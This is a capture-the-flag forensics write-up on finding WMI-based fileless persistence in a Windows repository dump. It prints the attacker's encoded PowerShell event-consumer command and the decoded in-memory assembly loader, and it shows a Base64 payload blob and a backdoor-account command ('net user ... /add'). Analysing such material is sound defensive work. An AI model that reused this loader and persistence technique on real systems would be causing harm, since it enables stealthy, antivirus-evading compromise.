# Hacker Holidays: Day 12 - After Hours

**Category:** Forensics
**Difficulty:** Medium
**Points:** 90

## 🛎️ Concierge Briefing
> Long after the front desk closes and the pool lights dim, the resort's back-office machines keep humming. Someone, or something, has been logging in during the small hours, well after the night-shift technician has gone home.
> 
> Nothing obvious shows up in Startup, Scheduled Tasks, or the registry Run keys. Whatever's keeping itself alive is hiding somewhere quieter, tucked away in a corner of the system most tools don't think to check.

---

## 🕵️‍♂️ Initial Analysis & Identifying the Files
When I first downloaded and extracted the challenge files, I was presented with a directory containing the following:
- `INDEX.BTR`
- `MAPPING1.MAP`
- `MAPPING2.MAP`
- `MAPPING3.MAP`
- `OBJECTS.DATA`

Right away, this specific cluster of files stood out. If you've done Windows forensics before, you'll recognize these immediately. These are the database files for the **WMI (Windows Management Instrumentation) Repository**. On a live Windows system, these files are normally located in `C:\Windows\System32\wbem\Repository`.

The challenge description gave a massive hint: *"Nothing obvious shows up in Startup, Scheduled Tasks, or the registry Run keys. Whatever's keeping itself alive is hiding somewhere quieter..."* 
Furthermore, the hint from @0xMia stated: *"the usual autoruns/persistence tools straight up don't catch this one"*.

WMI is notoriously used by advanced threat actors (like APT29 or FIN7) to establish fileless persistence on a system. It works by combining three core components:
1. **Event Filter** (`__EventFilter`): The trigger (e.g., system startup, or a specific time of day).
2. **Event Consumer** (`__EventConsumer`): The action to perform (e.g., run a script, execute a command).
3. **Filter To Consumer Binding** (`__FilterToConsumerBinding`): Links the trigger to the action so they actually fire.

Since standard WMI parsing tools sometimes fail on custom or corrupted implants, I figured my best bet was to roll up my sleeves and dig through the `OBJECTS.DATA` file manually to look for the malicious Event Consumer.

---

## 🛠️ Step 1: Hunting for the Persistence Mechanism

The `OBJECTS.DATA` file contains the actual definitions of the WMI classes and instances. Since attackers typically execute commands or PowerShell scripts through WMI event consumers, I started by running a strings-search against this file for suspicious keywords.

I fired up PowerShell and used `Select-String` to search the raw binary data for common execution keywords like `powershell`, `cmd`, or `EventConsumer`.

```powershell
Select-String -Path "OBJECTS.DATA" -Pattern "powershell|cmd\.exe" -CaseSensitive:$false
```

Looking through the terminal output, I found something extremely suspicious tied to an `EngineTelemetryConsumer` and a `CommandLineEventConsumer`. Here is exactly what popped out:

```text
OBJECTS.DATA:140371: ... CommandLineEventConsumer  cmd /C powershell.exe -Sta -Nop -Window Hidden -enc JABmAGkAbABlACAAPQAgACgAWwBXAG0AaQBDAGwAYQBzAHMAXQAnAFIATwBPAFQAXABjAGkAbQB2ADIAOgBXAGkAbgAzADIAXwBIAGEAcgBkAHcAYQByAGUAVABlAGwAZQBtAGUAdAByAHkAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAG4AZgBpAGcARABhAHQAYQAnAF0ALgBWAGEAbAB1AGUAOwANAAoAJABvACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQA7AA0ACgAkAGQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEQAZQBmAGwAYQB0AGUAUwB0AHIAZQBhAG0AKABbAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAF0AWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAGYAaQBsAGUAKQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApADsADQAKACQAYgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AKAAxADAAMgA0ACkAOwANAAoAJAByACAAPQAgACQAZAAuAFIAZQBhAGQAKAAkAGIALAAwACwAMQAwADIANAApADsADQAKAHcAaABpAGwAZQAoACQAcgAgAC0AZwB0ACAAMAApAHsADQAKACAAIAAgACAAJABvAC4AVwByAGkAdABlACgAJABiACwAMAAsACQAcgApADsADQAKACAAIAAgACAAJAByACAAPQAgACQAZAAuAFIAZQBhAGQAKAAkAGIALAAwACwAMQAwADIANAApADsADQAKAH0ADQAKAFsAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgAJABvAC4AVABvAEEAcgByAGEAeQAoACkAKQAuAEUAbgB0AHIAeQBQAG8AaQBuAHQALgBJAG4AdgBvAGsAZQAoACQAbgB1AGwAbAAsAEAAKAAsAFsAcwB0AHIAaQBuAGcAWwBdAF0AQAAoACkAKQApAHwATwB1AHQALQBOAHUAbABsAA== ...
```

This was a massive red flag. We've found a `CommandLineEventConsumer` that launches a hidden PowerShell window executing a Base64 encoded payload. This is exactly how attackers maintain a stealthy foothold.

## 🔓 Step 2: Decoding the Stager
To figure out what the attacker's script was actually doing, I needed to decode that Base64 string. PowerShell's `-enc` flag expects Base64-encoded UTF-16LE (Unicode) strings, not standard ASCII. We can decode it using a quick PowerShell one-liner:

```powershell
$encoded = "JABmAGkAbABlACAAPQAgACgAWwBX..."
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
```

The output revealed a beautifully crafted, highly evasive fileless malware loader:

```powershell
$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;
$o = New-Object IO.MemoryStream;
$d = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($file),[IO.Compression.CompressionMode]::Decompress);
$b = New-Object Byte[](1024);
$r = $d.Read($b,0,1024);
while($r -gt 0){
    $o.Write($b,0,$r);
    $r = $d.Read($b,0,1024);
}
[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke($null,@(,[string[]]@()))|Out-Null
```

### Analyzing the Loader
I took a moment to break down exactly what this loader was doing:
1. `$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;`
   - It queries WMI for a custom class named `Win32_HardwareTelemetry` and grabs the value of its `ConfigData` property.
2. It then treats this data as a Base64 string (`[Convert]::FromBase64String($file)`).
3. It passes that data into a `DeflateStream` set to `Decompress`, indicating the payload is compressed.
4. It reads the decompressed bytes into a `MemoryStream`.
5. Finally, `[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke(...)` loads the resulting bytes directly into memory as a .NET Assembly (a DLL or EXE) and executes it without ever writing it to disk.

This is a classic fileless execution technique. The actual payload is hiding inside a fake WMI class named `Win32_HardwareTelemetry`!

## 🧩 Step 3: Extracting the Embedded Payload
Now that I knew the payload was stored inside `Win32_HardwareTelemetry`, I needed to find that class inside `OBJECTS.DATA`.

I ran another search on `OBJECTS.DATA`, this time looking for `Win32_HardwareTelemetry` and printing some context lines to capture the payload:

```powershell
Select-String -Path "OBJECTS.DATA" -Pattern "Win32_HardwareTelemetry" -Context 0,5
```

This lead me straight to the `ConfigData` property, which contained a massive Base64 string:
```text
OBJECTS.DATA:140324: ... Win32_HardwareTelemetry  ConfigData                   
OBJECTS.DATA:140325:  ?     D    string  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
```

To analyze the malicious payload safely, I decided to adapt the attacker's own PowerShell loader. Instead of executing the payload in memory with `[Reflection.Assembly]::Load()`, I modified the script to just dump the decompressed bytes to a file on disk:

```powershell
$b64 = "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"
$bytes = [Convert]::FromBase64String($b64)
$ms = New-Object IO.MemoryStream(,$bytes)
$ds = New-Object IO.Compression.DeflateStream($ms, [IO.Compression.CompressionMode]::Decompress)
$msOut = New-Object IO.MemoryStream
$ds.CopyTo($msOut)
[IO.File]::WriteAllBytes("payload.dll", $msOut.ToArray())
```

After executing this script, I successfully dumped a 4096-byte file named `payload.dll`.

## 🚩 Step 4: Finding the Flag
With the malicious .NET assembly successfully extracted, it was time to figure out what it actually did. Rather than fully reverse-engineering it with a heavy tool like `dnSpy` or `ILSpy`, I started with basic static analysis: extracting printable strings.

I ran a quick PowerShell command to dump all ASCII strings longer than 4 characters from the file:
```powershell
$bytes = [System.IO.File]::ReadAllBytes("payload.dll")
[System.Text.Encoding]::ASCII.GetString($bytes) -split "`0" | Where-Object { $_.Length -gt 4 }
```

Scanning through the output, my eyes landed on a very interesting sequence near the bottom:

```text
updates.exe
Program
AfterHours
...
bytelotusdc
cmd.exe
/c net user patch VEhNe1JFREFDVEVEfQ== /add
Execution halted: Environment mismatch.
```

The payload appeared to be an executable named `updates.exe` (or internally `AfterHours`). More importantly, what it attempted to do was execute a local system command: `cmd.exe /c net user patch VEhNe1JFREFDVEVEfQ== /add`. 

This command creates a backdoor user on the system named `patch`, with the password set to `VEhNe1JFREFDVEVEfQ==`.

Notice how the password ends with `==` and looks exactly like a Base64 encoded string? That had to be the flag!

I took that string and decoded it one last time:

```powershell
[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('VEhNe1JFREFDVEVEfQ=='))
```

Output:
```text
THM{REDACTED}
```

And there it was—the hidden flag!

### 📝 Final Thoughts
This challenge perfectly demonstrated a sophisticated, fileless persistence mechanism using the WMI repository. The attacker:
1. Created an Event Consumer to execute an obfuscated PowerShell loader.
2. Hid the compressed payload in a custom WMI class (`Win32_HardwareTelemetry`).
3. Used the PowerShell loader to extract, decompress, and load the malware directly into memory without it touching the disk, effectively bypassing most traditional AV software and persistence hunters.

**Flag:** `THM{REDACTED}`
